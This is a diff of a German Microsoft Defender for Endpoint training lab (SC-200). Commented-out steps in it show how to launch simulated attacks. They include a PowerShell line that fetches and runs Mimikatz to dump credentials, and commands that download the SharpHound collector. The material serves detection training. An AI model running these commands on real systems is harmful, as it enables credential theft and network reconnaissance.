@@ -14,7 +14,7 @@ Sie sind Security Operations Analyst in einem Unternehmen, das Microsoft Defende
 
 Um die Fähigkeiten von Defender for Endpoint zur Abwehr von Angriffen zu testen, führen Sie zwei simulierte Angriffe aus.
 
->**Hinweis:** Eine **[interaktive Labsimulation](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** ist verfügbar, mit der Sie dieses Lab in Ihrem eigenen Tempo durcharbeiten können. Möglicherweise liegen geringfügige Unterschiede zwischen der interaktiven Simulation und dem gehosteten Lab vor, aber die dargestellten Kernkonzepte und Ideen sind identisch. 
+>**Hinweis:** Eine **[interaktive Labsimulation](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** ist verfügbar, mit der Sie dieses Lab in Ihrem eigenen Tempo durcharbeiten können. Möglicherweise liegen geringfügige Unterschiede zwischen der interaktiven Simulation und dem gehosteten Lab vor, aber die dargestellten Kernkonzepte und Ideen sind identisch.
 
 
 ### Aufgabe 1: Überprüfung des Onboarding der Geräte
@@ -43,54 +43,56 @@ In dieser Aufgabe bestätigen Sie, dass das Gerät erfolgreich integriert ist un
 
 ### Aufgabe 2: Simulierte Angriffe
 
-In dieser Aufgabe führen Sie zwei *simulierte* Angriffe mit *PowerShell* auf *WIN1* aus, um die Funktionen von Microsoft Defender for Endpoint zu erkunden.
+>**Hinweis:** Das Auswertungslabor und der Abschnitt „Tutorials & Simulationen“ des Portals sind nicht mehr verfügbar. Die folgenden Schritte werden nur zur Referenz bereitgestellt. Eine Demonstration der simulierten Angriffe finden Sie in der **[interaktiven Laborsimulation](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)**. Wir arbeiten daran, einen Ersatz für die simulierten Angriffe zu finden.
+
+<!--- In this task, you will run two *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.
 
 `Attack 1: Mimikatz - Credential Dumping`
 
-1. Geben Sie auf dem Computer *WIN1* die Zeichenfolge **Command** in die Suchleiste ein, und wählen Sie**Als Administrator ausführen** aus.
+1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.
 
-1. Kopieren Sie den folgenden Befehl, fügen Sie ihn in das Fenster **Administrator: Eingabeaufforderung** ein, und drücken Sie die **EINGABETASTE**, um ihn auszuführen.
+1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.
 
     ```CommandPrompt
     powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
     ```
 
-1. Es sollte die Meldung *Zugriff verweigert* und eine Popupnachricht von `Microsoft Defender Antivirus, Windows Security Virus and threats protection` angezeigt werden, dass *Bedrohungen gefunden* wurden.
+1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.
 
-1. Schließen Sie das Fenster **Administrator: Eingabeaufforderung** durch Eingabe von **exit** und Drücken der **EINGABETASTE**.
+1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.
 
 `Attack 2: Bloodhound - Collection`
 
-1. Geben Sie auf dem Computer *WIN1* die Zeichenfolge **PowerShell ** in die Suchleiste ein, und wählen Sie **Windows PowerShell** und dann **Als Administrator ausführen** aus.
+1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.
 
-1. Kopieren Sie die folgenden Befehle, fügen Sie sie in das Fenster **Administrator: Windows PowerShell** ein, und drücken Sie die **EINGABETASTE**, um sie auszuführen.
+1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
 
     ```PowerShell
     New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
     Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
     ```
 
-    >**Hinweis:** Es wird empfohlen, die Befehle einzeln zu kopieren, einzufügen und auszuführen. Dazu können Sie *Editor* öffnen und die Befehle in eine temporäre Datei kopieren. Der erste Befehl erstellt einen Ordner namens *ExternalPayloads* in dem Ordner, in dem sich der Ordner *Atomic Red Team* befindet. Der zweite Befehl lädt die Datei *SharpHound.ps1* aus dem GitHub-Repository *BloodHound* herunter und speichert sie im Ordner *ExternalPayloads*.
+    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.
 
-1. Es sollte eine Popupmeldung von `Windows Security Virus and threats protection` angezeigt werden, dass *Bedrohungen gefunden* wurden.
+1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.
 
-1. Kopieren Sie den folgenden Befehl, fügen Sie ihn in das Fenster **Administrator: Windows PowerShell** ein, und drücken Sie die **EINGABETASTE**, um sie auszuführen.
+1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
 
     ```PowerShell
     Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
     ```
 
-1. Wenn die Ausgabe *True* lautet, wurde die Datei mit den Schadsoftwarenutzdaten von Microsoft Defender Antivirus nicht entfernt. Wenn die Ausgabe *False* lautet, wurde die Datei mit den Schadsoftwarenutzdaten von Microsoft Defender Antivirus entfernt. Verwenden Sie die NACH-OBEN-TASTE, um den Befehl zu wiederholen, bis die Ausgabe *False* lautet.
+1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*. --->
 
-<!---1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.
+1. Wählen Sie im linken Menü unter **Endpunkte** die Option **Auswertung und Tutorials** und dann auf der linken Seite **Tutorials und Simulationen** aus.
 
-1. Select the **Tutorials** tab.
+1. Wählen Sie die Registerkarte **Tutorials** aus.
 
-1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.
+1. Unter *Automatisierte Untersuchung (Hintertür)* sehen Sie eine Meldung, die das Szenario beschreibt.  Klicken Sie unterhalb dieses Absatzes auf **Exemplarische Vorgehensweise lesen**. Eine neue Browser-Registerkarte mit Anweisungen zur Durchführung der Simulation wird geöffnet.
 
-1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button. 
+1. Suchen Sie in der neuen Browser-Registerkarte den Abschnitt **Simulation durchführen** (Seite 5, ab Schritt 2) und führen Sie die Schritte zur Durchführung des Angriffs aus. **Hinweis:** Die Simulationsdatei *RS4_WinATP-Intro-Invoice.docm* finden Sie im Portal direkt unter der **exemplarischen Vorgehensweise**, die Sie im vorherigen Schritt über die Schaltfläche **Simulationsdatei erhalten** ausgewählt haben.
 
-1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
+<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
 
 ### Aufgabe 3: Untersuchung der Angriffe
 
